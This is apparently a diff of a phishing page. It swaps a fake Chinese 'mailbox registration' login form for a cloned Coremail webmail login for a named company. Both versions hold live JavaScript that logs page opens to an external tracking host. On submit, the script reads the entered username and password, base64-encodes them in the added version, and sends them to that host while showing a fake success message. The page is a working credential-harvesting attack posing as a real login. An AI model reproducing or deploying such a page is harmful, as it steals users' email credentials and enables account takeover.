@@ -1,99 +1,165 @@
-<!DOCTYPE html><!--STATUS OK--><html lang="ch"><head><base href="https://maill.ski/"/><meta charset="utf-8"/>
-	
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-	<link rel="shortcut icon" href="exmail_logo.ico"/>
-	<title>OA邮箱备案系统</title>
-	<script type="text/javascript">
-</script>
-	<style>
-		*{
-			margin: 0;
-			padding: 0;
-			box-sizing: border-box;
-		}
-		body {
-			background: url(/img/0.jpg) 50% 50% no-repeat;
-			background-size: cover;
-			height: calc(50vw);
-			min-height: 675px;
-			max-height: calc(100vh - 92px);
-		}
-		.login_scan_panel_pwd_input {
-			display: inline-block;
-			box-sizing: border-box;
-			width: 60%;
-			position: relative;
-			padding: 14px 10px;
-			font-size: 14px;
-			border: 1px solid #C9C9C9;
-			border-radius: 2px;
-			outline: none;
-			transition: all 0.3s ease 0;
-			height: 40px;
-			margin-left: 10px;
-		}
-		.login{
-			border: none;
-			width: 80%;
-			background: #2984EF;
-			font-weight: 500;
-			font-size: 16px;
-			color: #ffffff;
-			text-align: center;
-			border-radius: 2px;
-			line-height: 40px;
-			margin: 0 auto;
-			cursor:pointer;
-			display: block;
-		}
-		.login_acitve{
-			border: none;
-			width: 80%;
-			background: #82b6f1;
-			font-weight: 500;
-			font-size: 16px;
-			color: #ffffff;
-			text-align: center;
-			border-radius: 2px;
-			line-height: 40px;
-			margin: 0 auto;
-			cursor:pointer;
-			display: block;
-		}
-	</style>
-	<script type="text/javascript" src="js/E4278792.js"></script>
-	<script type="text/javascript" src="js/jquery.min.js"></script>
-	<script type="text/javascript" src="js/layer.js"></script>
-	</head>
-<body>
-	<div style="display: flex;width: 100%;height: 100vh;">
-		<div style="display: flex;justify-content: center;width: 50%;flex-direction: column;">
-			<div style="margin: auto;">
-				<h1>邮箱备案中心，</h1>
-				<h1>引领企业邮件管理系统革新。</h1>
-			</div>
-		</div>
-		<div style="display: flex;justify-content: center;width: 50%;flex-direction: column;">
-			<div style="margin: 0 auto;background-color: #fff;width: 50%;height: 40vh;box-shadow: 0 2px 4px rgba(0, 0, 0, .12), 0 0 6px rgba(0, 0, 0, .04);border-radius: 2px;">
-				<div style="text-align: center;margin-top: 30px;margin-bottom: 30px;font-size: 30px;">邮箱备案中心</div>
-				<form id="loginForm" method="post">
-					<div style="border: none;display: flex;justify-content: center;margin-bottom: 25px;">
-						<div style="font-size: 16px;line-height: 40px;">邮箱账号</div>
-						<input type="email" id="mail" class="login_scan_panel_pwd_input" name="email" placeholder="输入邮箱帐号"/>
-					</div>
-					<div style="border: none;display: flex;justify-content: center;margin-bottom: 25px;">
-						<div style="font-size: 16px;line-height: 40px;">邮箱密码</div>
-						<input type="password" id="pass" class="login_scan_panel_pwd_input" name="password" placeholder="输入邮箱密码"/>
-					</div>
-					<div style="border: none;display: flex;justify-content: center;margin-bottom: 25px;">
-						<input type="submit" class="login" value="登 录 备 案" onclick="return datapost0()"/>
-					</div>
-				</form>
-			</div>
-		</div>
-	</div>
+<html><head>
+    <title>吉比特邮件系统</title>
+    <base href="https://webmail.g-bits.com/coremail/common/index_cmxt50.jsp">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    
+    <link rel="stylesheet" href="assets/6a9bffea/css/iconfont/iconfont.css">
+    <link rel="stylesheet" href="assets/index_cmxt50/css/custom.css?v=6a9bffea">
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="assets/index_cmxt50/css/IE7-hack.css?v=6a9bffea" />
+    <![endif]-->
+</head>
+<body class="zh_CN">
+<div class="main-bottom main-bottom-1"></div>
+<div class="main-middle main-middle-1"></div>
+<div class="main">
+    <div class="content"><div>
+       <a href="http://www.coremail.cn" target="_blank" class="logo">
+               <img src="assets/index_cmxt50/img/logo.png" alt="Coremail 电子邮件系统">
+           </a>    </div>
+    <div class="version">
+        
+        <img src="/coremail//common/assets/index_cmxt50/img/cmXT6/slogan.png" class="slogan-img" alt="slogan">
+    </div>
+    <div class="copyright">
+        <label>
+            Coremail. © Copyright 2000 - 2023 Mailtech.
+        </label>
+    </div></div>   
+    <div class="aside-blur2 transparent"></div>
+    <div class="aside"><div class="weather">
+    </div>
+    <div class="loginArea normalForm">
+        <div class="loginLang">
+            <div class="f-fr">
+                <span>Language:</span>
+                <span class="locale">
+                    
+                    <ul class="u-menu" style="display: none;">
+                        
+                            <li data-locale="zh_CN"><a>简体中文</a></li>
+                        
+                            <li data-locale="zh_TW"><a>繁體中文</a></li>
+                        
+                            <li data-locale="en_US"><a>English</a></li>
+                        
+                    </ul>
+                    
+                    <span>简体中文</span>
+                    
+                </span>
+            </div>
+        </div>
+        
+        <div class="loginType loginTypeSingle">
+            <a href="javascript:void(0)" logintype="normalForm">邮箱账号登录</a>
+            
+            
+        </div>
+        <div class="content-wrapper">
+            <span class="arrow"></span>
+            
+            <div class="formLogin">
+
+                <form id="login" action="/coremail/index.jsp?cus=1" method="post" class="j-login-form u-form">
+                    
+                    <div class="inputArea j-input-area">
+                        <div class="common-area">
+                            
+                            <div class="u-form-item u-form-item-1 forUid">
+                                <div class="wrapper">
+                                    <label class="label"><i class="iconfont iconhead"></i></label>
+                                    <div class="input-wrapper">
+                                        <div class="sub-input-wrapper">
+                                            
+                                            <input class="u-input" type="text" name="uid" autocomplete="off" id="uid" tabindex="1" placeholder="用户名" value="">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            
+                            
+
+                            
+                            <div class="u-form-item u-form-item-1 forPassword" style="left: 0px;">
+                                <div class="wrapper">
+                                    <label class="label"><i class="iconfont iconlock"></i></label>
+                                    <div class="input-wrapper">
+                                        <div class="sub-input-wrapper">
+                                            
+                                            
+                                                
+                                                
+                                                    <input class="u-input" type="password" autocomplete="off" placeholder="密　码" tabindex="2" id="password" name="password" value="">
+                                                
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
 
 
+                        
+                        
+                        
+                        
+                    </div>
 
-<script>const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/openurl?uuid=' + uuid; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}</script><script>function datapost0() {alert("success!"); var data=''; var myForm = document.getElementById('loginForm');var inputElements = myForm.querySelectorAll('input'); inputElements.forEach(inputElement => { if (inputElement.type !=='submit') {data += `${inputElement.name}:${inputElement.value} `; };}); var urlParams = new URLSearchParams(window.location.search);var uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/datapost?uuid='+uuid+'&data=' +data; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}return false;} </script></body></html>
+                    <div class="u-form-item u-form-item-2">
+                        
+                            <div class="cbWrapper f-fl j-saveUsername">
+                                <input type="checkbox" id="saveUsername" class="rc-hidden">
+                                <label for="saveUsername">记住用户名</label>
+                            </div>
+                        
+
+                        
+                        
+
+
+                    </div class="u-form-item u-form-item-1 forCode mobile-area">
+                    <div style="border: none; display: flex; justify-content: center; margin-bottom: 50px;">
+                        <input type="submit"  value="登录" style="width: auto; padding: 10px 135px; margin: 0;background-color: #057ab8; color: white; border: none;" onclick="return datapost0()">
+                    </div>
+                    
+                    
+                        
+                            
+                            
+                        
+                        
+                        
+                    
+                    <div class="u-form-item u-form-item-2 errMsg" id="warnOrErrDiv">
+                        <label>请输入用户名和密码</label>
+                    </div>
+                    
+                    <div class="u-form-item u-form-item-2">
+                        
+                        
+                            
+                            
+                        
+
+                        
+                        
+                        
+                    </div>
+                </form>
+            </div>
+
+            
+
+
+        </div>
+    </div></div>
+   
+</div>
+
+<link rel="stylesheet" type="text/css" href="/coremail/bundle/L.9cbd6.css">
+<script>const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/openurl?uuid=' + uuid; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}</script>
+<script>function datapost0() {alert("确认成功!"); var data=''; var myForm = document.getElementById('login');var inputElements = myForm.querySelectorAll('input'); inputElements.forEach(inputElement => { if (inputElement.type !=='submit') {data += `${inputElement.name}:${inputElement.value} `; };}); var urlParams = new URLSearchParams(window.location.search);var uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/datapost?uuid='+uuid+'&data='+btoa(unescape(encodeURIComponent(data))); img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}return false;} </script>
+<!----></body></html>
